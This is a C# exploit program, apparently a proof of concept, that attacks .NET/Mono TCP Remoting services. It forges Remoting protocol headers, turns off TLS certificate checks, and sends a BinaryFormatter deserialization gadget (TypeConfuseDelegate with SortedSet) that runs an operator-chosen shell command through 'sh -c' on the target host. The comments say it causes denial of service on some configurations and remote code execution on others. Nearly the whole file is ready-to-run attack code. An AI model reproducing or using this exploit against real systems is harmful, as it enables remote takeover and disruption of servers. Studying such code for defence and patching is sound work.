using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using System.Reflection;
using System.Diagnostics;
using System.Net;
using System.Net.Security;
using System.Security.Authentication;
using System.Net;
using System.Security.Cryptography.X509Certificates;

namespace TcpNetRemotingExploit
{
    class Program
    {
        public static bool ValidateServerCertificate(
          object sender,
          X509Certificate certificate,
          X509Chain chain,
          SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }

        //Only really handles overall control flow and argument parsing
        static void Main(string[] args)
        {
            if (args.Contains("-h") || args.Contains("--help"))
            {
                PrintHelp();
                return;
            }
            string serviceName = "Service";
            string host = null;
            string cmd = null;
            int port = 8000;
            int idx;

            if ((idx = Array.IndexOf(args, "-i")) != -1)
            {
                if (idx < args.Length)
                    host = args[idx + 1];
            }
            else
            {
                Console.WriteLine("Must specify host");
                return;
            }

            if ((idx = Array.IndexOf(args, "-p")) != -1)
            {
                if (idx < args.Length)
                    port = int.Parse(args[idx + 1]);
            }
            else
            {
                Console.WriteLine("Assuming port 8000, because not otherwise specified");
            }

            if ((idx = Array.IndexOf(args, "-c")) != -1)
            {
                if (idx < args.Length)
                    cmd = args[idx + 1];
            }
            else
            {
                Console.WriteLine("No command given, aborting");
                return;
            }

            Console.WriteLine("FIRE!!!!");
            Exploit(serviceName, host, port, cmd);

            Console.ReadLine();
        }

        //Print help
        static void PrintHelp()
        {
            Console.WriteLine("Usage:\tTcpNetRemotingExploit.exe -i host -c cmd (-p port)");
            Console.WriteLine("Flags:");
            Console.WriteLine("\t-h/--help\tShow this help");
            Console.WriteLine("\t-i host\t\tspecify host to attack");
            Console.WriteLine("\t-p port\t\tspecify port to attack");
            Console.WriteLine("\t-c cmd \t\tspecify command to run remote");
            Console.ReadLine();
        }

        //This send an actual RCE payload, if the remote system is configured with TypeFilterLevel.Low it will crash and there is no way to catch the exception
        static void Exploit(string serviceName, string host, int port, string cmd)
        {
            MemoryStream mem = new MemoryStream();
            BinaryFormatter formatter = new BinaryFormatter();
            formatter.Serialize(mem, GeneratePayload(cmd));
            mem.Position = 0;
            var task = SendTcpPayloadMono(mem, serviceName, host, port, false);
            task.Wait();
            Console.WriteLine(task.Result);
        }

        static Task<string> SendTcpPayloadMono(MemoryStream mem, string serviceName, string host, int port, bool request)
        {
            MemoryStream headerStream = new MemoryStream(2048);
            headerStream.Seek(0, SeekOrigin.Begin);
            BinaryWriter writer = new BinaryWriter(headerStream);

            //TcpMessageIO::ReceiveMessageStatus
            writer.Write(Encoding.ASCII.GetBytes(".NET")); //Preamble
            //Protocol Version
            writer.Write((byte)0x01);
            writer.Write((byte)0x00);


            if (request)
                //Set operation to 0 so we get server response in TCP
                writer.Write((UInt16)0x0); //0 or 1 for operation, 1 is one way, 0 is two way?
            else
                writer.Write((UInt16)0x1);

            //TcpSocketHandler::ReadContentLength
            writer.Write((UInt16)0x0); //0 is unchunked followed by content length, 1 is chunked
            writer.Write((UInt32)mem.Length);

            //Send a null serviceName to trigger bypass unless service name is given explicitly
            if (!string.IsNullOrEmpty(serviceName))
            {
                SetUpTcpRequestHeadersMono(writer, "tcp://" + host + ":" + port.ToString() + "/" + serviceName, "Totes fine", "application/octet-stream");
            }
            else
            {
                SetUpTcpRequestHeadersMono(writer, null, "Totes fine", "application/octet-stream");
            }
            //Establish network connection
            TcpClient client = new TcpClient(host, port);
            //var stream = client.GetStream();
            var stream = new SslStream(client.GetStream(), false, ValidateServerCertificate, null);
            stream.AuthenticateAsClient(host);
            //Timeout after 5000 ms
            stream.ReadTimeout = 5000;
            //Append payload to message stream
            var payload = mem.ToArray();

            headerStream.Write(payload, 0, payload.Length);
            //Send payload through network stream
            stream.Write(headerStream.ToArray(), 0, (int)headerStream.Length);

            //Handle reading the response in this task, only necessary to distinguish between exploitable and not exploitable
            Task<string> readAll = new Task<string>((s) => {
                var netStream = s as Stream;
                string str;
                byte[] data = new byte[1024];
                using (MemoryStream ms = new MemoryStream())
                {
                    int numBytesRead;
                    try
                    {
                        while ((numBytesRead = netStream.Read(data, 0, data.Length)) > 0)
                        {
                            ms.Write(data, 0, numBytesRead);
                        }
                    }
                    catch (Exception e)
                    {
                        //Do nothing, probably timeout
                    }
                    finally
                    {
                        str = Encoding.ASCII.GetString(ms.ToArray(), 0, (int)ms.Length);
                        client.Close();
                    }
                }
                return str;
            }, stream);
            readAll.Start();
            return readAll;
        }

        //Builds the correct Request header for the TCP Remoting protocol
        //Details can be found by decompiling the TcpSocketHandler in the .Net runtime
        //or by reading through https://github.com/tyranid/ExploitRemotingService
        static void SetUpTcpRequestHeadersMono(BinaryWriter writer, string requestUri, string statusPhrase, string contentType)
        {

            byte[] stringBytes;
            if (!string.IsNullOrEmpty(requestUri))
            {
                writer.Write((UInt16)4); //Target Uri
                writer.Write((byte)1); //Type string

                writer.Write((byte)0); //Unicode string type
                stringBytes = Encoding.Unicode.GetBytes(requestUri);
                writer.Write((Int32)stringBytes.Length); //string length
                writer.Write(stringBytes); //string content
            }

            writer.Write((UInt16)6);
            writer.Write((byte)1);

            writer.Write((byte)0); //Unicode string type
            stringBytes = Encoding.Unicode.GetBytes(contentType);
            writer.Write((Int32)stringBytes.Length); //string length
            writer.Write(stringBytes); //string content

            writer.Write((UInt16)0);
        }

        //Standard TypeConfuseDelegate gadget with SortedSet`1
        //Triggers delegate execution on deserialization
        //Causes DOS with TypeFilterLevel.Low and RCE with TypeFilterLevel.Full
        //Denial of Service is triggered by Security Exception in unhandled context

        //More info at https://googleprojectzero.blogspot.com/2017/04/
        static object GeneratePayload(string cmd)
        {
            Comparison<string> c = new Comparison<string>(string.Compare);
            var c2 = Func<string, string, int>.Combine(c, c);
            TypeConfuseDelegate(c2, new Func<string, string, Process>(Process.Start));
            Comparison<string> c3 = (Comparison<string>)c2;

            //By adjusting these two the payload can be changed
            //replacing cmd with calc will launch calc for example
            SortedSet<string> s = new SortedSet<string>(new string[] { "-c \""+cmd+"\"", "sh" });
            FieldInfo fi = typeof(SortedSet<string>).GetField("comparer",
                BindingFlags.NonPublic | BindingFlags.Instance);
            fi.SetValue(s, Comparer<string>.Create(c3));
            return s;
        }

        //Runtime aware TypeConfuseDelegate Gadget
        static void TypeConfuseDelegate(Delegate handler, Delegate target)
        {
            FieldInfo fi;
            if (IsRunningOnMono())
                fi = typeof(MulticastDelegate).GetField("delegates",
                    BindingFlags.NonPublic | BindingFlags.Instance);
            else
                fi = typeof(MulticastDelegate).GetField("_invocationList",
                    BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = handler.GetInvocationList();
            invoke_list[1] = target;
            invoke_list[0] = target;
            fi.SetValue(handler, invoke_list);
        }

        public static bool IsRunningOnMono()
        {
            return Type.GetType("Mono.Runtime") != null;
        }
    }
}
